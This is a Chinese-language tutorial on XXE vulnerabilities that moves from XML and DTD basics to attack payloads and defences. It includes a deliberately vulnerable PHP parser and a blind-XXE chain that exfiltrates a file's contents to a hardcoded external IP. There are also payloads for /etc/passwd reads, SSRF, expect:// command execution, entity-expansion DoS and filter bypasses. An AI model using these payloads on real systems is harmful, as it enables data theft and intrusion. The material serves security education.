
# XXE(XML外部实体引用)

## XML基础

XML 指可扩展标记语言（eXtensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语言，被设计用来传输和存储数据。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。目前，XML文件作为配置文件（Spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）应用比较广泛。 XML 的语法规范由 DTD （Document Type Definition）来进行控制。

## 实体

所有的XML文档都由五种简单的构建模块（元素，属性，实体，PCDATA CDATA）构成。这里着重介绍一下实体：实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。实体可在内部或外部进行声明。因此我们利用引入实体，构造恶意内容，从而达到攻击的目的

实体总共有四种，分别是:
- 内置实体 (Built-in entities)
- 字符实体 (Character entities)
- 通用实体 (General entities)
- 参数实体 (Parameter entities)

其中内置实体和字符实体都和 HTML 的实体编码类似，但如果从另一个角度看，实体完全可以分成两个派别：通用实体和参数实体。

## DTD（Document Type Definition）

文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于XML文档中（内部引用），也可作为一个外部引用。

内部声明DTD

    <!DOCTYPE 根元素 [元素声明]>

引用外部DTD

    <!DOCTYPE 根元素 SYSTEM "文件名">

## PCDATA

PCDATA 的意思是被解析的字符数据（parsed character data）
PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记

## CDATA

CDATA，意为character data，是标记语言SGML与XML，表示文档的特定部分是普通的字符数据，而不是非字符数据或有特定、限定结构的字符数据。在XML文档或外部实体中，一个CDATA section是一段按字面解释的内容，不作为标记文本。字符用CDATA节表示或者按照标准语法表示，并无差异。

CDATA 部分由`<\![CDATA["开始，由"]]\>`结束

通俗的讲CDATA 是不会被解析器解析的文本, 常用的场景为文本中包含特殊字符串的时候

## 基本语法

XML 文档在开头有 ``<?xml version="1.0" encoding="UTF-8" standalone="yes"?>`` 的结构，这种结构被称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，但是必须放在文档开头。

除了可选的开头外，XML 语法主要有以下的特性：

- 所有 XML 元素都须有关闭标签
- XML 标签对大小写敏感
- XML 必须正确地嵌套
- XML 文档必须有根元素
- XML 的属性值需要加引号

另外，XML也有CDATA语法，用于处理有多个字符需要转义的情况。


## XXE

XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。

## 攻击方式


### Blind XXE 无回显读取本地敏感文件

靶机: xxe_blind_test.php

```php
<?php
    libxml_disable_entity_loader (false);
    $xmlfile = file_get_contents('php://input');
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
?>
```

攻击机: payload

```xml
<!DOCTYPE convert [
<!ENTITY % remote SYSTEM "http://target/evil.dtd">
%remote;%int;%send;
]>
```

攻击机: evil.dtd

```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///c:/flag.txt">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://47.97.199.89:9999?p=%file;'>">
```

连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 evil.dtd ，有点类似于将 evil.dtd 包含进来，然后 %int 调用 evil.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 &#37;)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程服务器上，这样就实现了外带数据的效果，解决了 XXE 无回显的问题。

### http网络探测

    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE data SYSTEM "http://ip:80/" [
        <!ELEMENT data (#PCDATA)>
    ]>
    <data>7</data>
响应结果中存在Connection refuse, 说明端口是关闭的

### 拒绝服务攻击

    <!DOCTYPE data [
    <!ELEMENT data (#ANY)>
    <!ENTITY a0 "dos" >
    <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;">
    <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;">
    ]>
    <data>&a2;</data>

若解析过程非常缓慢，则表示测试成功，目标站点可能有拒绝服务漏洞。
具体攻击可使用更多层的迭代或递归，也可引用巨大的外部实体，以实现攻击的效果。


### 文件读取

    <?xml version="1.0"?>
    <!DOCTYPE data [
    <!ELEMENT data (#ANY)>
    <!ENTITY file SYSTEM "file:///etc/passwd">
    ]>
    <data>&file;</data>

### SSRF

    <?xml version="1.0"?>
    <!DOCTYPE data SYSTEM "http://publicServer.com/" [
    <!ELEMENT data (#ANY)>
    ]>
    <data>4</data>

### RCE

    <?xml version="1.0"?>
    <!DOCTYPE GVI [ <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "expect://id" >]>
    <catalog>
       <core id="test101">
          <description>&xxe;</description>
       </core>
    </catalog>

### XInclude

    <?xml version='1.0'?>
    <data xmlns:xi="http://www.w3.org/2001/XInclude">
        <xi:include href="http://publicServer.com/file.xml">
        </xi:include>
    </data>


## 绕过

- <!DOCTYPE :. SYTEM "http://"
- <!DOCTYPE :_-_: SYTEM "http://"
- <!DOCTYPE {0xdfbf} SYSTEM "http://"

## 防御方案

- 使用开发语言提供的禁用外部实体的方法
    ```php
    php:
    libxml_disable_entity_loader(true);
    ```

    ```java
    java:
    DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
    dbf.setExpandEntityReferences(false);
    ```

    ```python
    python:
    from lxml import etree
    xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
    ```
- 过滤用户提交的XML数据, <!DOCTYPE和<!ENTITY，或者SYSTEM和PUBLIC等

## 参考链接

- [XML教程](http://www.w3school.com.cn/xml/)
- [未知攻焉知防 XXE漏洞攻防](https://security.tencent.com/index.php/blog/msg/69)
- [XXE 攻击笔记分享](http://www.freebuf.com/articles/web/97833.html)
- [从XML相关一步一步到XXE漏洞](https://xz.aliyun.com/t/6887)
- [Web安全学习之XXE漏洞利用](https://ca0y1h.top/Web_security/basic_learning/20.xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/)